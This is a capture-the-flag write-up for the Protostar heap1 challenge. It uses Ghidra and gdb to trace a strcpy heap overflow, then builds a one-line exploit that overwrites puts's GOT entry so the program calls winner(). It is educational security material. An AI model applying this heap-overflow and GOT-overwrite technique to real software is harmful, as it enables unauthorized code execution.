# exploit_exercises protostar heap 1

Let's take a look at the binary. Also this challenge is a bit different from the others, it's from the protostar wargame and the goal is to call the `winner` function (not pop a shell). Also this isn't the original binary, I recompiled it:

```
$	file heap1
heap1: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-, for GNU/Linux 3.2.0, BuildID[sha1]=0840a5076b50649a07ba60e78144b2bf30297c92, not stripped
$	pwn checksec heap1
[*] '/Hackery/pod/modules/heap_overflow/protostarHeap1/heap1'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
$	./heap1 
Segmentation fault (core dumped)
$	./heap1 15935728
Segmentation fault (core dumped)
$	./heap1 15935728 75395128
and that's a wrap folks!
```

So we are dealing with a `32` bit binary with no PIE or RELRO. It also expects two inputs passed as arguments to the program. When we take a look at the main function in Ghidra, we see this:

```
/* WARNING: Function: __x86.get_pc_thunk.bx replaced with injection: get_pc_thunk_bx */

undefined4 main(undefined4 argc,int argv)

{
  undefined4 *chunk0;
  void *ptr0;
  undefined4 *chunk1;
  void *ptr1;
  
  chunk0 = (undefined4 *)malloc(8);
  *chunk0 = 1;
  ptr0 = malloc(8);
  *(void **)(chunk0 + 1) = ptr0;
  chunk1 = (undefined4 *)malloc(8);
  *chunk1 = 2;
  ptr1 = malloc(8);
  *(void **)(chunk1 + 1) = ptr1;
  strcpy((char *)chunk0[1],*(char **)(argv + 4));
  strcpy((char *)chunk1[1],*(char **)(argv + 8));
  puts("and that\'s a wrap folks!");
  return 0;
}
```

So we can see that this program starts off by allocating two heap structures. The structure of those structures is this:

```
0x4:	integer (either 1, or 2)
0x8:	ptr to eight byte space allocated with malloc
```

The bug here is the two `strcpy` calls. They aren't checking if the space it is writing to is big enough to hold the data, so we have an overflow. Taking a look at how the data is laid out in the heap in gdb, we see this:

```
gef➤  disas main
Dump of assembler code for function main:
   0x080484e1 <+0>:	lea    ecx,[esp+0x4]
   0x080484e5 <+4>:	and    esp,0xfffffff0
   0x080484e8 <+7>:	push   DWORD PTR [ecx-0x4]
   0x080484eb <+10>:	push   ebp
   0x080484ec <+11>:	mov    ebp,esp
   0x080484ee <+13>:	push   esi
   0x080484ef <+14>:	push   ebx
   0x080484f0 <+15>:	push   ecx
   0x080484f1 <+16>:	sub    esp,0x1c
   0x080484f4 <+19>:	call   0x80483f0 <__x86.get_pc_thunk.bx>
   0x080484f9 <+24>:	add    ebx,0x1b07
   0x080484ff <+30>:	mov    esi,ecx
   0x08048501 <+32>:	sub    esp,0xc
   0x08048504 <+35>:	push   0x8
   0x08048506 <+37>:	call   0x8048360 <malloc@plt>
   0x0804850b <+42>:	add    esp,0x10
   0x0804850e <+45>:	mov    DWORD PTR [ebp-0x20],eax
   0x08048511 <+48>:	mov    eax,DWORD PTR [ebp-0x20]
   0x08048514 <+51>:	mov    DWORD PTR [eax],0x1
   0x0804851a <+57>:	sub    esp,0xc
   0x0804851d <+60>:	push   0x8
   0x0804851f <+62>:	call   0x8048360 <malloc@plt>
   0x08048524 <+67>:	add    esp,0x10
   0x08048527 <+70>:	mov    edx,eax
   0x08048529 <+72>:	mov    eax,DWORD PTR [ebp-0x20]
   0x0804852c <+75>:	mov    DWORD PTR [eax+0x4],edx
   0x0804852f <+78>:	sub    esp,0xc
   0x08048532 <+81>:	push   0x8
   0x08048534 <+83>:	call   0x8048360 <malloc@plt>
   0x08048539 <+88>:	add    esp,0x10
   0x0804853c <+91>:	mov    DWORD PTR [ebp-0x1c],eax
   0x0804853f <+94>:	mov    eax,DWORD PTR [ebp-0x1c]
   0x08048542 <+97>:	mov    DWORD PTR [eax],0x2
   0x08048548 <+103>:	sub    esp,0xc
   0x0804854b <+106>:	push   0x8
   0x0804854d <+108>:	call   0x8048360 <malloc@plt>
   0x08048552 <+113>:	add    esp,0x10
   0x08048555 <+116>:	mov    edx,eax
   0x08048557 <+118>:	mov    eax,DWORD PTR [ebp-0x1c]
   0x0804855a <+121>:	mov    DWORD PTR [eax+0x4],edx
   0x0804855d <+124>:	mov    eax,DWORD PTR [esi+0x4]
   0x08048560 <+127>:	add    eax,0x4
   0x08048563 <+130>:	mov    edx,DWORD PTR [eax]
   0x08048565 <+132>:	mov    eax,DWORD PTR [ebp-0x20]
   0x08048568 <+135>:	mov    eax,DWORD PTR [eax+0x4]
   0x0804856b <+138>:	sub    esp,0x8
   0x0804856e <+141>:	push   edx
   0x0804856f <+142>:	push   eax
   0x08048570 <+143>:	call   0x8048350 <strcpy@plt>
   0x08048575 <+148>:	add    esp,0x10
   0x08048578 <+151>:	mov    eax,DWORD PTR [esi+0x4]
   0x0804857b <+154>:	add    eax,0x8
   0x0804857e <+157>:	mov    edx,DWORD PTR [eax]
   0x08048580 <+159>:	mov    eax,DWORD PTR [ebp-0x1c]
   0x08048583 <+162>:	mov    eax,DWORD PTR [eax+0x4]
   0x08048586 <+165>:	sub    esp,0x8
   0x08048589 <+168>:	push   edx
   0x0804858a <+169>:	push   eax
   0x0804858b <+170>:	call   0x8048350 <strcpy@plt>
   0x08048590 <+175>:	add    esp,0x10
   0x08048593 <+178>:	sub    esp,0xc
   0x08048596 <+181>:	lea    eax,[ebx-0x19ab]
   0x0804859c <+187>:	push   eax
   0x0804859d <+188>:	call   0x8048370 <puts@plt>
   0x080485a2 <+193>:	add    esp,0x10
   0x080485a5 <+196>:	mov    eax,0x0
   0x080485aa <+201>:	lea    esp,[ebp-0xc]
   0x080485ad <+204>:	pop    ecx
   0x080485ae <+205>:	pop    ebx
   0x080485af <+206>:	pop    esi
   0x080485b0 <+207>:	pop    ebp
   0x080485b1 <+208>:	lea    esp,[ecx-0x4]
   0x080485b4 <+211>:	ret    
End of assembler dump.
gef➤  b *main+175
Breakpoint 1 at 0x8048590
gef➤  r 1593572 7539512
Starting program: /Hackery/pod/modules/heap_overflow/protostarHeap1/heap1 1593572 7539512
[ Legend: Modified register | Code | Heap | Stack | String ]
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$eax   : 0x0804b190  →  "7539512"
$ebx   : 0x0804a000  →  0x08049f14  →  0x00000001
$ecx   : 0xffffd2f5  →  "7539512"
$edx   : 0x0804b190  →  "7539512"
$esp   : 0xffffd010  →  0x0804b190  →  "7539512"
$ebp   : 0xffffd048  →  0x00000000
$esi   : 0xffffd060  →  0x00000003
$edi   : 0x0       
$eip   : 0x08048590  →  <main+175> add esp, 0x10
$eflags: [ZERO carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x0023 $ss: 0x002b $ds: 0x002b $es: 0x002b $fs: 0x0000 $gs: 0x0063 
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0xffffd010│+0x0000: 0x0804b190  →  "7539512"	 ← $esp
0xffffd014│+0x0004: 0xffffd2f5  →  "7539512"
0xffffd018│+0x0008: 0x00000000
0xffffd01c│+0x000c: 0x080484f9  →  <main+24> add ebx, 0x1b07
0xffffd020│+0x0010: 0xf7faf3fc  →  0xf7fb0200  →  0x00000000
0xffffd024│+0x0014: 0x00000000
0xffffd028│+0x0018: 0x0804b160  →  0x00000001
0xffffd02c│+0x001c: 0x0804b180  →  0x00000002
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:32 ────
    0x8048587 <main+166>       in     al, dx
    0x8048588 <main+167>       or     BYTE PTR [edx+0x50], dl
    0x804858b <main+170>       call   0x8048350 <strcpy@plt>
 →  0x8048590 <main+175>       add    esp, 0x10
    0x8048593 <main+178>       sub    esp, 0xc
    0x8048596 <main+181>       lea    eax, [ebx-0x19ab]
    0x804859c <main+187>       push   eax
    0x804859d <main+188>       call   0x8048370 <puts@plt>
    0x80485a2 <main+193>       add    esp, 0x10
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "heap1", stopped, reason: BREAKPOINT
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x8048590 → main()
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────

Breakpoint 1, 0x08048590 in main ()
gef➤  search-pattern 1593572
[+] Searching '1593572' in memory
[+] In '[heap]'(0x804b000-0x806d000), permission=rw-
  0x804b170 - 0x804b177  →   "1593572" 
[+] In '[stack]'(0xfffdd000-0xffffe000), permission=rw-
  0xffffd2ed - 0xffffd2f4  →   "1593572" 
gef➤  search-pattern 0x0804b170
[+] Searching '0x0804b170' in memory
[+] In '[heap]'(0x804b000-0x806d000), permission=rw-
  0x804b164 - 0x804b174  →   "\x70\xb1\x04\x08[...]" 
[+] In '[stack]'(0xfffdd000-0xffffe000), permission=rw-
  0xffffd000 - 0xffffd010  →   "\x70\xb1\x04\x08[...]" 
gef➤  x/20w 0x804b160
0x804b160:	0x00000001	0x0804b170	0x00000000	0x00000011
0x804b170:	0x33393531	0x00323735	0x00000000	0x00000011
0x804b180:	0x00000002	0x0804b190	0x00000000	0x00000011
0x804b190:	0x39333537	0x00323135	0x00000000	0x00021e69
0x804b1a0:	0x00000000	0x00000000	0x00000000	0x00000000
```

So we can see that our first input begins at `0x804b170`. We can also see that the second pointer that is written to is at `0x804b184`. This leaves us with a `0x804b184 - 0x804b170 = 20` byte difference. Here is the plan. With the first `strcpy` call we will overwrite the pointer at `0x0804b190` by inputting `20` bytes, plus a new pointer. Then with the second write, we will be able to write a value we want where we want to. Now is just the question of where to write it.

Since RELRO isn't enabled, we can write to the got table. This will make it so when it tries to call one function, it will actually call another. Looking at the disassembly we see that `puts` is called after the `strcpy` calls so that would probably be a good target. We can get it's got table entry (no PIE so we don't need an infoleak here) with objdump:

```
$	objdump -R heap1 | grep puts
0804a018 R_386_JUMP_SLOT   puts@GLIBC_2.0
```

Now instead of executing `puts`, we can just execute the `winner` function instead. We can also find it's address using objdump:

```
$	objdump -D heap1 | grep winner
080484b6 <winner>:
```

With that, we have everything we need for our exploit:

```
$	./heap1 `python -c 'print "0"*20 + "\x18\xa0\x04\x08" + " " + "\xb6\x84\x04\x08"'`
and we have a winner
```

Just like that, we got the flag!